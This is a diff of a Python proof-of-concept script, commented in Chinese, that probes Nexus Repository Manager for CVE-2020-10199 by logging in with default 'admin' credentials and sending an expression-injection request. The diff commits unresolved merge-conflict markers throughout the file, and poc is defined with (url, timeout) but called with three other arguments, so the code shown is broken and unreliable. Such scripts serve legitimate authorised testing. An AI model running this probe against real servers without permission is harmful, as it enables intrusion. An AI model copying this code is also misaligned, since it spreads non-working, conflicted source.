@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 # -*- coding:utf-8 -*-
+<<<<<<< HEAD
 """
 Nexus Repository Manager CVE-2020-10199 POC 检测脚本
 
@@ -30,10 +31,13 @@ OGNL 表达式的恶意请求。如果服务器返回计算结果，则说明存
 注意：
     此POC仅用于安全测试和授权的渗透测试，请勿用于非法用途。
 """
+=======
+>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
 
 import base64
 import requests
 import json
+<<<<<<< HEAD
 
 csrf = "0.15080630880112578"
 
@@ -49,6 +53,10 @@ def get_sessionid(ip, port, password):
     Returns:
         str: 会话 ID
     """
+=======
+csrf = "0.15080630880112578"
+def get_sessionid(ip, port, password):
+>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
     url = "http://" + ip + ":" + port
     login_url = url + "/service/rapture/session" # 登录url
     head = {"Content-Type": "application/x-www-form-urlencoded"}
@@ -58,6 +66,7 @@ def get_sessionid(ip, port, password):
     return resp['Set-Cookie'].split(";")[0].split('=')[1]
 
 def poc(url, timeout=10):
+<<<<<<< HEAD
     """
     检测目标是否存在 Nexus CVE-2020-10199 漏洞
     
@@ -68,6 +77,8 @@ def poc(url, timeout=10):
     Returns:
         tuple: (是否存在漏洞, 结果消息)
     """
+=======
+>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
     from urllib.parse import urlparse
     parsed = urlparse(url)
     ip = parsed.hostname or parsed.netloc.split(':')[0]
@@ -109,4 +120,9 @@ if __name__ == "__main__":
     ip = "127.0.0.1"
     port="8081"
     password="admin"
+<<<<<<< HEAD
     poc(ip, port, password)
+=======
+    # get_sessionid(ip, port, "admin")
+    poc(ip, port, password)
+>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
